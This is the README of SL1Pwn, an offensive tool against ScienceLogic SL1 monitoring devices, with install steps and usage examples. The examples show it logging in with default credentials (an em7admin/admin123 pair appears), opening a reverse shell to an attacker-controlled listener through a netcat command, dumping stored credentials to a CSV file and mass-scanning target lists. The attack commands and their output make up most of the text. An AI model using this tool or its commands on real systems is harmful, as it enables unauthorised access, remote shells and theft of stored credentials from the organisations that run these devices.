# SL1Pwn - ScienceLogic SL1 Exploitation
<p align="center">
  <img src="https://github.com/3NailsInfoSec/SL1Pwn/assets/131826735/38c24789-7936-4e48-9b04-f864453bdcfa">
</p>

This tool utilizes default credentials to obtain a reverse shell, dump credentials, and login via HTTP and SSH (single or bulk) on ScienceLogic SL1 devices. If default credentials are not correct, you can supply your own.
## Read:
<a href ="https://www.3nailsinfosec.com/post/using-discord-s-voice-channel-for-c2-operations">Hacking the Heartbeat Monitor of a Data Center - ScienceLogic SL1</a>

## Install:
```
git clone https://github.com/3NailsInfoSec/SL1Pwn.git
cd SL1Pwn
pip3 install -r requirements.txt
```
## Usage:

#### Login - Test login with default creds on port 443:
```
python3 sl1pwn.py -t 1.1.1.1

[+] UI Login Success! https://1.1.1.1:443
[+] API Login Success! https://1.1.1.1:443
```

#### SSH - Test ssh login with custom creds
```
python3 sl1pwn.py -t 1.1.1.1 -p 22 -user em7admin -pass admin123

[+] Possible SSH success 1.1.1.1:22
```

#### Shell - Pop shell on SL1 device (setup netcat listener first)
```
python3 sl1pwn.py -t 1.1.1.1 -shell -L 2.2.2.2 -P 4444

[+] UI Login Success! https://1.1.1.1:443
[+] API Login Success! https://1.1.1.1:443
[*] Created action with name: kjsKKe
[*] Created schedule successfully: 25
[*] Created automation successfully: 115

[+] Run book executed! Press enter when ready to clean up...

[*] Deleted action[121]: kjsKKe
[*] Deleted schedule[25]: kjsKKe
[*] Deleted automation[115]: kjsKKe

# nc -lvp 4444
Connection received on 1.1.1.1 45352
sh-4.2$
```

#### Dump - Dump all creds stored in SL1
```
python3 sl1pwn.py -t 1.1.1.1 -dump -o target_creds.csv

[*] Dumping 1.1.1.1::22 stored api credentials

[LifeSize: Endpoint SNMP]
[Cisco: CSP SNMP Port 161 Example]
[Cisco: CSP SNMP Port 1610 Exampl]
[Dell EMC: Isilon SNMPv2 Example]
[Cisco SNMPv3 - Example]
[Cisco SNMPv2 - Example]

[*] Saved to target_creds.csv
```

#### Scanning - Scan a combo IP:PORT list from a file
```
python3 sl1pwn.py -scan targets.txt -threads 25

[+] UI Login Success! https://1.1.1.1:443
[+] API Login Success! https://1.1.1.1:443
[+] UI Login Success! https://1.1.1.2:443
[+] API Login Success! https://1.1.1.2:443
```

## Credits
<a href ="https://twitter.com/sm00v">Twitter: @sm00v</a>

<a href ="https://github.com/sm00v">Github: @sm00v</a>
